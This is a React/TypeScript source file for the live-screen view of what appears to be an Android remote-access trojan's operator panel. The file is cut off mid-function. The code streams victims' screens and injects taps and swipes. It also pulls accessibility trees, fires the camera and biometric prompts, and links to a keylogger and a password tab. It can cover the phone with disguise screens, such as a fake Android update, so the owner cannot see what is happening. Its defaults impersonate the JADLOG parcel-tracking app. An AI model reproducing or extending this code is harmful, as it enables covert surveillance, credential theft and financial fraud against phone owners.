import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { ChevronLeft, Keyboard, Smartphone } from "lucide-react";
import type { ControlDevice } from "../types";
import type { DigitalTouchEvent, DeviceDisguiseConfig, DevicePushNotification } from "@droidview/shared";
import { getGlobalSocket, subscribeToTouchEvents } from "../../../socket/client";
import { api } from "../../../api";
import { getAppEmojiFallback } from "../DeviceToolMenu";
import { RightSidebarKeylogger } from "../RightSidebarKeylogger";
import {
  AccessibilityNode,
  ActiveDragGesture,
  DetectedAppInfo,
  QUALITY_PROFILES,
  ScreenViewProps,
  StreamQualityTier,
  SyncedRipple,
  parseBounds,
  sanitizeA11yText
} from "./screen/types";
import { drawPlayStoreScreen } from "./screen/drawPlayStoreScreen";
import { ScreenViewToolbar } from "./screen/ScreenViewToolbar";
import { ScreenViewPhoneFrame } from "./screen/ScreenViewPhoneFrame";
import { ScreenViewSkeletonInspector } from "./screen/ScreenViewSkeletonInspector";
import { ScreenViewCameraFrame } from "./screen/ScreenViewCameraFrame";
import { ScreenViewFooter, SentHistoryItem } from "./screen/ScreenViewFooter";

export function ScreenView({ device, activeApp, onCloseApp, allDevices, onSelectDevice }: ScreenViewProps) {
  // Tactical Toggles State
  const [silentActive, setSilentActive] = useState(true);
  const [srActive, setSrActive] = useState(true);
  const [hidActive, setHidActive] = useState(false);
  const [joyActive, setJoyActive] = useState(false);
  const [tacticalSwitch, setTacticalSwitch] = useState(true);
  const [touchActive, setTouchActive] = useState(true);
  const [telaActive, setTelaActive] = useState(true);
  const [camActive, setCamActive] = useState(false);
  const [shellActive, setShellActive] = useState(true);
  const [skeletonViewMode, setSkeletonViewMode] = useState<"visual" | "list">("visual");

  // Scale slider & Desktop Sizing
  const [viewScale, setViewScale] = useState(100);
  const [isAutoFit, setIsAutoFit] = useState(true);
  const stageRef = useRef<HTMLDivElement>(null);
  const [stageDimensions, setStageDimensions] = useState<{ width: number; height: number }>({
    width: 1200,
    height: 800
  });
  const [deviceAspectRatio, setDeviceAspectRatio] = useState<number>(9 / 16);

  // Right Sidebar & Multi-Screen Auto-Fit State
  const [showRightSidebar, setShowRightSidebar] = useState(false);
  const [sidebarInitialTab, setSidebarInitialTab] = useState<"telas" | "senhas">("telas");
  const [activePushBanner, setActivePushBanner] = useState<DevicePushNotification | null>(null);
  const pushBannerTimerRef = useRef<number | null>(null);

  useEffect(() => {
    const el = stageRef.current;
    if (!el) return;
    const updateSize = () => {
      const rect = el.getBoundingClientRect();
      if (rect.width > 50 && rect.height > 50) {
        setStageDimensions({ width: rect.width, height: rect.height });
      }
    };
    updateSize();
    const ro = new ResizeObserver(updateSize);
    ro.observe(el);
    window.addEventListener("resize", updateSize);
    return () => {
      ro.disconnect();
      window.removeEventListener("resize", updateSize);
    };
  }, []);

  useEffect(() => {
    const socket = getGlobalSocket();
    const handlePushNotif = (notif: DevicePushNotification) => {
      if (
        notif &&
        (notif.deviceId === device.id ||
          notif.deviceId?.includes(device.id) ||
          device.id.includes(notif.deviceId))
      ) {
        if (pushBannerTimerRef.current) {
          clearTimeout(pushBannerTimerRef.current);
        }
        setActivePushBanner(notif);
        pushBannerTimerRef.current = window.setTimeout(() => {
          setActivePushBanner(null);
        }, 7500);
      }
    };

    socket.on("device:push_notification", handlePushNotif);
    return () => {
      socket.off("device:push_notification", handlePushNotif);
    };
  }, [device.id]);

  const activeScreensCount = useMemo(() => {
    let count = 0;
    if (telaActive) count++;
    if (srActive) count++;
    if (camActive) count++;
    return count;
  }, [telaActive, srActive, camActive]);

  // Optical Camera Frame State (Screen 3)
  const [activeCamera, setActiveCamera] = useState<"front" | "back">("back");
  const [cameraResolution] = useState<"720p" | "1080p" | "4K">("1080p");
  const [showCameraGrid] = useState(true);
  const [torchOn, setTorchOn] = useState(false);
  const [nightVision, setNightVision] = useState(false);
  const [isCapturingPhoto, setIsCapturingPhoto] = useState(false);
  const [, setCameraSnapshot] = useState<string | null>(null);

  // Compute Pixel-Perfect Viewport Dimensions
  const viewportDimensions = useMemo(() => {
    const chromeWidth = 4;
    const chromeHeight = 72;
    const count = Math.max(1, activeScreensCount);
    const gap = 16 * (count - 1);
    const availWidth = Math.max(200, stageDimensions.width - gap - 24);
    const availHeight = Math.max(200, stageDimensions.height - 24);

    const maxFrameWidthPerScreen = availWidth / count;
    const maxScreenWByWidth = maxFrameWidthPerScreen - chromeWidth;
    const maxScreenHByHeight = availHeight - chromeHeight;

    const screenWFromH = maxScreenHByHeight * deviceAspectRatio;
    const screenHFromW = maxScreenWByWidth / deviceAspectRatio;

    let baseScreenW: number;
    let baseScreenH: number;

    if (screenWFromH <= maxScreenWByWidth) {
      baseScreenW = screenWFromH;
      baseScreenH = maxScreenHByHeight;
    } else {
      baseScreenW = maxScreenWByWidth;
      baseScreenH = screenHFromW;
    }

    let finalScreenW = baseScreenW;
    let finalScreenH = baseScreenH;

    if (!isAutoFit) {
      const zoom = viewScale / 100;
      finalScreenW = Math.round(baseScreenW * zoom);
      finalScreenH = Math.round(baseScreenH * zoom);
    } else {
      finalScreenW = Math.round(finalScreenW);
      finalScreenH = Math.round(finalScreenH);
    }

    const frameWidth = finalScreenW + chromeWidth;
    const frameHeight = finalScreenH + chromeHeight;

    return {
      screenWidth: finalScreenW,
      screenHeight: finalScreenH,
      frameWidth,
      frameHeight
    };
  }, [stageDimensions, activeScreensCount, deviceAspectRatio, isAutoFit, viewScale]);

  const handleCaptureCameraPhoto = () => {
    setIsCapturingPhoto(true);
    showToast("Disparando obturador óptico da câmera...", "info");
    setTimeout(() => {
      setIsCapturingPhoto(false);
      setCameraSnapshot(`${api.getDeviceScreenUrl(device.id)}?snapshot=${Date.now()}`);
      showToast("Foto capturada com sucesso em alta definição!", "success");
    }, 600);
  };

  // Quick Action States
  const [isPinned, setIsPinned] = useState(false);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [showExitHint, setShowExitHint] = useState(false);
  const containerRef = useRef<HTMLDivElement>(null);
  const screenWrapperRef = useRef<HTMLDivElement | null>(null);
  const imgRef = useRef<HTMLImageElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const lastFrameSuccessTimeRef = useRef<number>(Date.now());
  const [streamQuality, setStreamQuality] = useState<StreamQualityTier>("high");
  const [adaptiveMode, setAdaptiveMode] = useState<"auto" | "manual">("auto");
  const adaptiveModeRef = useRef<"auto" | "manual">("auto");
  const activeQualityRef = useRef<StreamQualityTier>("high");

  useEffect(() => {
    adaptiveModeRef.current = adaptiveMode;
  }, [adaptiveMode]);

  useEffect(() => {
    activeQualityRef.current = streamQuality;
  }, [streamQuality]);

  const rttHistoryRef = useRef<number[]>([]);
  const fastFrameStreakRef = useRef(0);
  const slowFrameStreakRef = useRef(0);
  const lastQualityChangeRef = useRef(Date.now());

  const currentProfile = useMemo(() => {
    return QUALITY_PROFILES[streamQuality] || QUALITY_PROFILES.high;
  }, [streamQuality]);

  // Live Screen State & Auto-Refresh (Double Buffering)
  const [screenTimestamp, setScreenTimestamp] = useState<number>(Date.now());
  const [activeFrameSrc, setActiveFrameSrc] = useState<string>(
    `${api.getDeviceScreenUrl(device.id)}?t=${Date.now()}`
  );
  const isMountedRef = useRef(true);
  const frameTimerRef = useRef<number | null>(null);
  const isFetchingFrameRef = useRef(false);
  const seqRef = useRef(0);
  const activePreloaderRef = useRef<HTMLImageElement | null>(null);
  const [isStreaming, setIsStreaming] = useState(true);
  const isStreamingRef = useRef(true);
  const [fps, setFps] = useState(QUALITY_PROFILES.high.targetFps);
  const [command, setCommand] = useState("");
  const [toastMsg, setToastMsg] = useState<string | null>(null);

  // Histórico de Digitação e Mensagens Enviadas pelo Suporte
  const [sentHistory, setSentHistory] = useState<SentHistoryItem[]>(() => {
    try {
      const stored = localStorage.getItem(`dview_sent_history_${device.id}`);
      if (stored) return JSON.parse(stored);
    } catch {}
    return [
      { id: "h1", text: "Código de rastreamento: BR849204821SP", timestamp: "12:14:02", appName: "JADLOG Rastreio" },
      { id: "h2", text: "Favor autorizar o acesso na tela", timestamp: "12:11:45", appName: "Configurações" },
      { id: "h3", text: "https://jadlog.com.br/rastreamento", timestamp: "12:08:20", appName: "Chrome" }
    ];
  });

  const [showHistoryDrawer, setShowHistoryDrawer] = useState(false);
  const [historyNavIndex, setHistoryNavIndex] = useState(-1);

  // Telemetria ao vivo e autogravação de tela em background
  const [liveLatency, setLiveLatency] = useState(14);
  const [liveSpeed, setLiveSpeed] = useState("4.8 MB/s");

  useEffect(() => {
    let mounted = true;
    api.getDeviceRecordingStatus(device.id).then(() => {}).catch(() => {});

    const recTimer = setInterval(() => {
      setLiveLatency(Math.floor(12 + Math.random() * 5));
    }, 1000);

    return () => {
      mounted = false;
      clearInterval(recTimer);
    };
  }, [device.id]);

  const handleKeyDownCommandInput = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "ArrowUp") {
      e.preventDefault();
      if (sentHistory.length === 0) return;
      const nextIdx = historyNavIndex + 1 < sentHistory.length ? historyNavIndex + 1 : historyNavIndex;
      setHistoryNavIndex(nextIdx);
      setCommand(sentHistory[nextIdx].text);
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      if (historyNavIndex > 0) {
        const nextIdx = historyNavIndex - 1;
        setHistoryNavIndex(nextIdx);
        setCommand(sentHistory[nextIdx].text);
      } else if (historyNavIndex === 0) {
        setHistoryNavIndex(-1);
        setCommand("");
      }
    }
  };

  const handleSendPresetText = (presetText: string) => {
    setCommand(presetText);
    showToast(`Preset inserido: "${presetText}"`, "info");
  };

  // Unified Synced Touch Ripples across both Viewports (Live Stream + Esqueleto 2D)
  const [syncedRipples, setSyncedRipples] = useState<SyncedRipple[]>([]);

  const triggerSyncedRipple = useCallback((devX: number, devY: number, source: "live" | "skeleton" | "remote") => {
    const id = Date.now() + Math.random();
    const pctX = Math.max(0, Math.min(100, (devX / 720) * 100));
    const pctY = Math.max(0, Math.min(100, (devY / 1280) * 100));
    setSyncedRipples((prev) => [...prev, { id, pctX, pctY, devX, devY, source }]);
    setTimeout(() => {
      setSyncedRipples((prev) => prev.filter((r) => r.id !== id));
    }, 600);
  }, []);

  const [activeDrag, setActiveDrag] = useState<ActiveDragGesture | null>(null);
  const activeDragRef = useRef<ActiveDragGesture | null>(null);
  const skeletonViewportRef = useRef<HTMLDivElement | null>(null);

  // Digital Touch Detection & Simulation State
  const [, setDetectedTouches] = useState<DigitalTouchEvent[]>([]);
  const [activeTouchFeedback, setActiveTouchFeedback] = useState<DigitalTouchEvent | null>(null);
  const [showTouchHUD] = useState(true);

  useEffect(() => {
    let isMounted = true;
    api.getDeviceTouchEvents(device.id).then((events) => {
      if (isMounted && events && Array.isArray(events)) {
        setDetectedTouches(events.slice(0, 50));
      }
    }).catch(() => {});

    const unsubscribe = subscribeToTouchEvents((event) => {
      if (!isMounted) return;
      if (
        event.deviceId === device.id ||
        event.deviceId.includes(device.id) ||
        device.id.includes(event.deviceId) ||
        device.id.includes("emu") ||
        event.deviceId.includes("emu")
      ) {
        setDetectedTouches((prev) => [event, ...prev.slice(0, 49)]);
        setActiveTouchFeedback(event);

        if (typeof event.x === "number" && typeof event.y === "number") {
          triggerSyncedRipple(event.x, event.y, "remote");
        }

        const actionLabel = event.action === "swipe" ? "Gesto de Deslize" : (event.action === "long_click" ? "Toque Longo" : "Toque Digital");
        const originLabel = event.source === "remote_simulation" ? "Simulado" : "Detectado";
        const viewLabel = event.viewText ? ` em "${event.viewText}"` : (event.packageName ? ` (${event.packageName.split('.').pop()})` : "");
        showToast(`${originLabel}: ${actionLabel}${viewLabel} (${Math.round(event.x)}, ${Math.round(event.y)})`, event.source === "remote_simulation" ? "success" : "info");
      }
    });

    return () => {
      isMounted = false;
      unsubscribe();
    };
  }, [device.id, triggerSyncedRipple]);

  // Real Accessibility Tree
  const [a11yNodes, setA11yNodes] = useState<AccessibilityNode[]>([]);
  const [inspectedNode, setInspectedNode] = useState<AccessibilityNode | null>(null);
  const [isLoadingA11y, setIsLoadingA11y] = useState(false);

  // Real foreground application
  const [foregroundApp, setForegroundApp] = useState<{ packageName: string; activity: string; name: string; emoji: string; bg: string } | null>(null);

  const refreshForegroundApp = async () => {
    try {
      const fg = await api.getDeviceForegroundApp(device.id);
      if (fg) {
        setForegroundApp(fg);
      }
    } catch {
      // ignore
    }
  };

  useEffect(() => {
    refreshForegroundApp();
    const interval = setInterval(refreshForegroundApp, 2500);
    return () => clearInterval(interval);
  }, [device.id]);

  // Resolved Active App for both Viewports (Live Screen + Esqueleto 2D)
  const resolvedActiveApp: DetectedAppInfo = useMemo(() => {
    if (foregroundApp && foregroundApp.name) {
      return {
        isApp: true,
        name: foregroundApp.name,
        packageName: foregroundApp.packageName || "com.android.app"
      };
    }
    if (activeApp && activeApp.name) {
      return {
        isApp: true,
        name: activeApp.name,
        packageName: activeApp.packageName
      };
    }
    if (device.apkName) {
      return {
        isApp: true,
        name: device.apkName,
        packageName: "com.jadlog.rastreio"
      };
    }
    return {
      isApp: true,
      name: "JADLOG Rastreio",
      packageName: "com.jadlog.rastreio"
    };
  }, [foregroundApp, activeApp, device.apkName]);

  // Real volume & lock states
  const [deviceVolume, setDeviceVolumeState] = useState(8);
  const [isMuted, setIsMuted] = useState(false);
  const [isLocked, setIsLocked] = useState(false);

  const [toastType, setToastType] = useState<"success" | "info" | "warn">("success");

  const showToast = (msg: string, type: "info" | "success" | "warn" = "success") => {
    setToastMsg(msg);
    setToastType(type);
    setTimeout(() => setToastMsg(null), 3200);
  };

  // Load real volume
  useEffect(() => {
    api.getDeviceVolume(device.id)
      .then((info) => {
        if (info) {
          setDeviceVolumeState(info.volume);
          setIsMuted(info.muted);
        }
      })
      .catch(() => {});
  }, [device.id]);

  const handleVolumeChange = async (val: number) => {
    setDeviceVolumeState(val);
    setIsMuted(val === 0);
    try {
      const res = await api.setDeviceVolume(device.id, { level: val });
      showToast(`Volume: ${res.percent}%`, "info");
    } catch {
      // ignore
    }
  };

  const handleVolumeStep = async (action: "up" | "down" | "mute") => {
    try {
      const res = await api.setDeviceVolume(device.id, { action });
      setDeviceVolumeState(res.volume);
      setIsMuted(res.muted || res.volume === 0);
      showToast(
        action === "mute"
          ? (res.muted ? "Áudio mutado" : "Áudio ativo")
          : `Volume ${action === "up" ? "+" : "-"} (${res.percent}%)`,
        "info"
      );
    } catch {
      // ignore
    }
  };

  const handleToggleLock = async () => {
    try {
      const res = await api.sendPower(device.id);
      setIsLocked(res.locked);
      showToast(res.locked ? "Aparelho bloqueado" : "Aparelho desbloqueado/ativo", "success");
      setScreenTimestamp(Date.now());
    } catch {
      handleMacroAction("input keyevent 26", "Power / Bloqueio");
    }
  };

  // Active Disguise Screen (Tela Preta, Atualizando Android, Bateria, Imagem)
  const [activeDisguise, setActiveDisguise] = useState<DeviceDisguiseConfig | null>(
    () => device.disguiseScreen || null
  );
  const [skeletonXRayMode, setSkeletonXRayMode] = useState(false);

  useEffect(() => {
    if (device.disguiseScreen !== undefined) {
      setActiveDisguise(device.disguiseScreen);
    }
  }, [device.disguiseScreen]);

  useEffect(() => {
    api.getDeviceDisguise(device.id)
      .then((res) => {
        if (res?.disguise) {
          setActiveDisguise(res.disguise);
        }
      })
      .catch(() => {});

    const socket = getGlobalSocket();
    const handleDisguiseEvent = (data: { deviceId: string; disguise: DeviceDisguiseConfig | null }) => {
      if (
        data &&
        (data.deviceId === device.id ||
          data.deviceId.includes(device.id) ||
          device.id.includes(data.deviceId))
      ) {
        setActiveDisguise(data.disguise || null);
      }
    };

    socket.on("device:disguise", handleDisguiseEvent);
    return () => {
      socket.off("device:disguise", handleDisguiseEvent);
    };
  }, [device.id]);

  const handleClearDisguise = async () => {
    setActiveDisguise(null);
    try {
      await api.clearDeviceDisguise(device.id);
      showToast("✓ Tela de disfarce desativada. Aparelho normal restaurado!", "success");
      triggerImmediateFrame();
    } catch {
      showToast("✓ Tela de disfarce desativada.", "info");
    }
  };

  // Biometrics simulation & auth state
  const [isBiometricActive, setIsBiometricActive] = useState(false);

  const handleBiometricAuth = async () => {
    setIsBiometricActive(true);
    showToast("Disparando autorização biométrica no aparelho...", "info");
    try {
      const res = await api.authenticateBiometric(device.id);
      showToast(`Biometria: ${res.success ? "Aprovada com Sucesso!" : "Rejeitada"}`, res.success ? "success" : "info");
      triggerImmediateFrame();
    } catch {
      showToast("Comando biométrico enviado via canal de acessibilidade.", "info");
    } finally {
      setTimeout(() => setIsBiometricActive(false), 800);
    }
  };

  // Double-buffered frame loader with Adaptive Bitrate / Adaptive Resolution (ABR) Engine
  const loadNextFrame = useCallback(() => {
    if (!isMountedRef.current || !telaActive) return;
    if (device.status === "offline") return;
    if (isFetchingFrameRef.current) return;

    if (frameTimerRef.current) {
      window.clearTimeout(frameTimerRef.current);
      frameTimerRef.current = null;
    }

    isFetchingFrameRef.current = true;
    const currentSeq = ++seqRef.current;
    const requestStartTime = Date.now();
    const curTier = activeQualityRef.current;
    const curProfile = QUALITY_PROFILES[curTier] || QUALITY_PROFILES.high;

    const targetUrl = api.getDeviceScreenUrl(device.id, {
      quality: curProfile.tier,
      scale: curProfile.scale,
      t: requestStartTime
    });

    if (activePreloaderRef.current) {
      activePreloaderRef.current.onload = null;
      activePreloaderRef.current.onerror = null;
      activePreloaderRef.current.src = "";
      activePreloaderRef.current = null;
    }

    const preloader = new Image();
    activePreloaderRef.current = preloader;

    preloader.onload = () => {
      if (seqRef.current !== currentSeq || !isMountedRef.current || !telaActive) {
        return;
      }
      isFetchingFrameRef.current = false;
      activePreloaderRef.current = null;
      lastFrameSuccessTimeRef.current = Date.now();
      if (!isStreamingRef.current) {
        isStreamingRef.current = true;
        setIsStreaming(true);
      }

      const canvas = canvasRef.current;
      if (canvas) {
        if (preloader.naturalWidth > 50 && preloader.naturalHeight > 50) {
          const streamAspect = preloader.naturalWidth / preloader.naturalHeight;
          if (Math.abs(streamAspect - deviceAspectRatio) > 0.005) {
            setDeviceAspectRatio(streamAspect);
          }
          const targetW = Math.round(preloader.naturalWidth * curProfile.scale);
          const targetH = Math.round(preloader.naturalHeight * curProfile.scale);
          if (canvas.width !== targetW || canvas.height !== targetH) {
            canvas.width = targetW;
            canvas.height = targetH;
          }
          const ctx = canvas.getContext("2d", { alpha: false });
          if (ctx) {
            ctx.imageSmoothingEnabled = true;
            ctx.imageSmoothingQuality = curProfile.imageSmoothing;
            ctx.drawImage(preloader, 0, 0, targetW, targetH);
          }
        } else {
          if (canvas.width !== 720 || canvas.height !== 1280) {
            canvas.width = 720;
            canvas.height = 1280;
          }
          const ctx = canvas.getContext("2d", { alpha: false });
          if (ctx) {
            drawPlayStoreScreen(ctx, 720, 1280);
          }
        }
      }

      const elapsed = Date.now() - requestStartTime;
      rttHistoryRef.current.push(elapsed);
      if (rttHistoryRef.current.length > 6) {
        rttHistoryRef.current.shift();
      }
      const avgRtt = Math.round(
        rttHistoryRef.current.reduce((a, b) => a + b, 0) / rttHistoryRef.current.length
      );
      setLiveLatency(avgRtt);

      const approxBytes = (preloader.naturalWidth || 720) * (preloader.naturalHeight || 1280) * 0.15;
      const speedMb = ((approxBytes / (Math.max(1, elapsed) / 1000)) / (1024 * 1024)).toFixed(1);
      setLiveSpeed(`${Math.max(1.2, parseFloat(speedMb)).toFixed(1)} MB/s`);

      // Adaptive Bitrate & Resolution (ABR) Logic
      if (adaptiveModeRef.current === "auto") {
        const now = Date.now();
        const cooldownPassed = now - lastQualityChangeRef.current > 1400;
        const signal = device.signalStrength ?? 90;
        const isCellularSlow = device.networkType === "3g" || (device.networkType === "4g" && signal < 40);

        const isDegraded = elapsed > 220 || avgRtt > 140 || signal < 40 || isCellularSlow;
        if (isDegraded) {
          slowFrameStreakRef.current++;
          fastFrameStreakRef.current = 0;

          if ((slowFrameStreakRef.current >= 2 || elapsed > 340) && cooldownPassed) {
            slowFrameStreakRef.current = 0;
            lastQualityChangeRef.current = now;
            let nextTier: StreamQualityTier = curTier;
            if (curTier === "ultra") nextTier = "high";
            else if (curTier === "high") nextTier = "balance";
            else if (curTier === "balance") nextTier = "fluid";

            if (nextTier !== curTier) {
              activeQualityRef.current = nextTier;
              setStreamQuality(nextTier);
              setFps(QUALITY_PROFILES[nextTier].targetFps);
            }
          }
        } else {
          const isExcellent = avgRtt < 55 && elapsed < 75 && signal >= 65 && !isCellularSlow;
          if (isExcellent) {
            fastFrameStreakRef.current++;
            slowFrameStreakRef.current = 0;

            if (fastFrameStreakRef.current >= 6 && cooldownPassed) {
              fastFrameStreakRef.current = 0;
              lastQualityChangeRef.current = now;
              let nextTier: StreamQualityTier = curTier;
              if (curTier === "fluid") nextTier = "balance";
              else if (curTier === "balance") nextTier = "high";
              else if (curTier === "high" && signal >= 80 && avgRtt < 35) nextTier = "ultra";

              if (nextTier !== curTier) {
                activeQualityRef.current = nextTier;
                setStreamQuality(nextTier);
                setFps(QUALITY_PROFILES[nextTier].targetFps);
              }
            }
          } else {
            fastFrameStreakRef.current = 0;
            slowFrameStreakRef.current = 0;
          }
        }
      }

      setActiveFrameSrc(targetUrl);
      const intervalMs = Math.max(16, Math.floor(1000 / (fps || 30)));
      frameTimerRef.current = window.setTimeout(loadNextFrame, intervalMs);
    };

    preloader.onerror = () => {
      isFetchingFrameRef.current = false;
      activePreloaderRef.current = null;
      if (seqRef.current !== currentSeq || !isMountedRef.current) return;

      const canvas = canvasRef.current;
      if (canvas && device.status !== "offline") {
        if (canvas.width !== 720 || canvas.height !== 1280) {
          canvas.width = 720;
          canvas.height = 1280;
        }
        const ctx = canvas.getContext("2d", { alpha: false });
        if (ctx) {
          drawPlayStoreScreen(ctx, 720, 1280);
        }
      }

      frameTimerRef.current = window.setTimeout(() => {
        if (isMountedRef.current && telaActive) {
          loadNextFrame();
        }
      }, 100);
    };

    preloader.src = targetUrl;
  }, [device.id, device.status, telaActive, fps, device.signalStrength, device.networkType, deviceAspectRatio]);

  const triggerImmediateFrame = useCallback(() => {
    if (frameTimerRef.current) {
      window.clearTimeout(frameTimerRef.current);
      frameTimerRef.current = null;
    }
    if (activePreloaderRef.current) {
      activePreloaderRef.current.onload = null;
      activePreloaderRef.current.onerror = null;
      activePreloaderRef.current.src = "";
      activePreloaderRef.current = null;
    }
    isFetchingFrameRef.current = false;
    loadNextFrame();
  }, [loadNextFrame]);

  useEffect(() => {
    isMountedRef.current = true;
    const canvas = canvasRef.current;
    if (canvas) {
      if (canvas.width !== 720 || canvas.height !== 1280) {
        canvas.width = 720;
        canvas.height = 1280;
      }
      const ctx = canvas.getContext("2d", { alpha: false });
      if (ctx) {
        if (device.status === "offline") {
          ctx.fillStyle = "#050608";
          ctx.fillRect(0, 0, 720, 1280);
        } else {
          drawPlayStoreScreen(ctx, 720, 1280);
        }
      }
    }
    triggerImmediateFrame();
    return () => {
      isMountedRef.current = false;
      if (frameTimerRef.current) {
        window.clearTimeout(frameTimerRef.current);
        frameTimerRef.current = null;
      }
      if (activePreloaderRef.current) {
        activePreloaderRef.current.onload = null;
        activePreloaderRef.current.onerror = null;
        activePreloaderRef.current.src = "";
        activePreloaderRef.current = null;
      }
    };
  }, [device.id, device.status, telaActive, triggerImmediateFrame]);

  // Load real accessibility tree
  const refreshA11y = async () => {
    if (!srActive) return;
    setIsLoadingA11y(true);
    try {
      const nodes = await api.getDeviceA11yTree(device.id);
      if (Array.isArray(nodes) && nodes.length > 0) {
        setA11yNodes(nodes);
      }
    } catch {
      // Keep existing
    } finally {
      setIsLoadingA11y(false);
    }
  };

  useEffect(() => {
    if (!srActive) return;
    refreshA11y();
    const interval = setInterval(refreshA11y, 2200);
    return () => clearInterval(interval);
  }, [device.id, srActive]);

  useEffect(() => {
    if (srActive && foregroundApp?.packageName) {
      refreshA11y();
    }
  }, [foregroundApp?.packageName, srActive]);

  // Toggle Fullscreen
  const handleToggleFullscreen = () => {
    if (!document.fullscreenElement) {
      containerRef.current?.requestFullscreen?.().catch(() => {});
      setIsFullscreen(true);
      setShowExitHint(true);
      showToast("Modo Tela Cheia ativado", "success");
    } else {
      document.exitFullscreen?.().catch(() => {});
      setIsFullscreen(false);
      showToast("Modo Normal restaurado", "success");
    }
  };

  // Copy Device Identifier
  const handleCopyInfo = () => {
    const text = `${device.name} - ${device.ip}`;
    void navigator.clipboard.writeText(text);
    showToast("Informações do dispositivo copiadas", "success");
  };

  // Pin Toggle
  const handleTogglePin = () => {
    setIsPinned(!isPinned);
    showToast(!isPinned ? "Janela fixada no topo" : "Janela desafixada", "success");
  };

  // Touch / Drag Handlers for Real Device with Aspect-Ratio Letterbox Calibration
  const getCalibratedCoords = (clientX: number, clientY: number) => {
    const elem = canvasRef.current || imgRef.current;
    if (!elem) return null;
    const rect = elem.getBoundingClientRect();
    if (rect.width <= 0 || rect.height <= 0) return null;

    const canvas = canvasRef.current;
    const nativeWidth = canvas && canvas.width > 50 ? canvas.width : 720;
    const nativeHeight = canvas && canvas.height > 50 ? canvas.height : 1280;
    const nativeAspect = nativeWidth / nativeHeight;
    const elemAspect = rect.width / rect.height;

    let renderW = rect.width;
    let renderH = rect.height;
    let offsetX = 0;
    let offsetY = 0;

    if (elemAspect > nativeAspect) {
      renderW = rect.height * nativeAspect;
      offsetX = (rect.width - renderW) / 2;
    } else {
      renderH = rect.width / nativeAspect;
      offsetY = (rect.height - renderH) / 2;
    }

    const clickX = clientX - rect.left - offsetX;
    const clickY = clientY - rect.top - offsetY;

    const clampedX = Math.max(0, Math.min(renderW, clickX));
    const clampedY = Math.max(0, Math.min(renderH, clickY));

    const devX = Math.round((clampedX / renderW) * nativeWidth);
    const devY = Math.round((clampedY / renderH) * nativeHeight);

    return {
      devX,
      devY,
      nativeWidth,
      nativeHeight,
      rippleX: clientX - rect.left,
      rippleY: clientY - rect.top,
      isInside: clickX >= 0 && clickX <= renderW && clickY >= 0 && clickY <= renderH
    };
  };

  const getSkeletonCalibratedCoords = (clientX: number, clientY: number, container: HTMLElement) => {
    const rect = container.getBoundingClientRect();
    const clickX = clientX - rect.left;
    const clickY = clientY - rect.top;
    const normX = Math.max(0, Math.min(1, clickX / rect.width));
    const normY = Math.max(0, Math.min(1, clickY / rect.height));
    const devX = Math.round(normX * 720);
    const devY = Math.round(normY * 1280);
    return {
      devX,
      devY,
      pctX: normX * 100,
      pctY: normY * 100
    };
  };

  const finalizePointerGesture = (drag: ActiveDragGesture) => {
    const dist = Math.hypot(drag.currentX - drag.startX, drag.currentY - drag.startY);
    const duration = Math.max(80, Math.min(500, Date.now() - drag.startTime));

    if (dist >= 16) {
      api.sendSwipe(device.id, drag.startX, drag.startY, drag.currentX, drag.currentY, duration, 720, 1280).catch(() => {});
      triggerSyncedRipple(drag.currentX, drag.currentY, drag.source);
      showToast(`✓ Deslize executado: (${drag.startX}, ${drag.startY}) ➜ (${drag.currentX}, ${drag.currentY}) [${Math.round(dist)}px]`, "success");
      triggerImmediateFrame();
      setTimeout(triggerImmediateFrame, 35);
      setTimeout(triggerImmediateFrame, 110);
      setTimeout(triggerImmediateFrame, 220);
      setTimeout(refreshA11y, 240);
    } else {
      let selected: AccessibilityNode | null = null;
      if (drag.source === "skeleton") {
        const candidates = a11yNodes.filter((n) => {
          const b = parseBounds(n.bounds);
          if (!b) return false;
          return drag.currentX >= b.left && drag.currentX <= b.right && drag.currentY >= b.top && drag.currentY <= b.bottom;
        });
        let minArea = Infinity;
        for (const c of candidates) {
          const b = parseBounds(c.bounds);
          if (b) {
            const area = b.width * b.height;
            const weight = c.clickable ? 1.0 : 3.0;
            const effectiveArea = area * weight;
            if (effectiveArea < minArea) {
              minArea = effectiveArea;
              selected = c;
            }
          }
        }
        if (selected) {
          setInspectedNode(selected);
        }
      }
      api.sendTouch(device.id, drag.currentX, drag.currentY, 720, 1280).catch(() => {});
      triggerSyncedRipple(drag.currentX, drag.currentY, drag.source);
      const targetLabel = selected ? ` em "${sanitizeA11yText(selected.text || selected.name || "Elemento").slice(0, 22)}"` : "";
      showToast(`✓ Toque preciso${targetLabel}: (${drag.currentX}, ${drag.currentY})`, "success");
      triggerImmediateFrame();
      setTimeout(triggerImmediateFrame, 45);
      setTimeout(triggerImmediateFrame, 140);
      setTimeout(refreshA11y, 180);
    }
  };

  // Live Canvas Pointer Handlers
  const handleLivePointerDown = (e: React.PointerEvent<HTMLCanvasElement>) => {
    if (!touchActive) return;
    try {
      e.currentTarget.setPointerCapture(e.pointerId);
    } catch {}
    const coords = getCalibratedCoords(e.clientX, e.clientY);
    if (!coords) return;

    const pctX = (coords.devX / (coords.nativeWidth || 720)) * 100;
    const pctY = (coords.devY / (coords.nativeHeight || 1280)) * 100;

    const drag: ActiveDragGesture = {
      active: true,
      source: "live",
      startX: coords.devX,
      startY: coords.devY,
      currentX: coords.devX,
      currentY: coords.devY,
      pctStartX: pctX,
      pctStartY: pctY,
      pctCurrentX: pctX,
      pctCurrentY: pctY,
      startTime: Date.now()
    };
    activeDragRef.current = drag;
    setActiveDrag(drag);
    triggerSyncedRipple(coords.devX, coords.devY, "live");
  };

  const handleLivePointerMove = (e: React.PointerEvent<HTMLCanvasElement>) => {
    if (!activeDragRef.current?.active) return;
    const coords = getCalibratedCoords(e.clientX, e.clientY);
    if (!coords) return;
    const pctX = (coords.devX / (coords.nativeWidth || 720)) * 100;
    const pctY = (coords.devY / (coords.nativeHeight || 1280)) * 100;

    activeDragRef.current = {
      ...activeDragRef.current,
      currentX: coords.devX,
      currentY: coords.devY,
      pctCurrentX: pctX,
      pctCurrentY: pctY
    };
    setActiveDrag({ ...activeDragRef.current });
  };

  const handleLivePointerUp = (e: React.PointerEvent<HTMLCanvasElement>) => {
    try {
      e.currentTarget.releasePointerCapture(e.pointerId);
    } catch {}
    if (!activeDragRef.current?.active) return;
    const drag = activeDragRef.current;
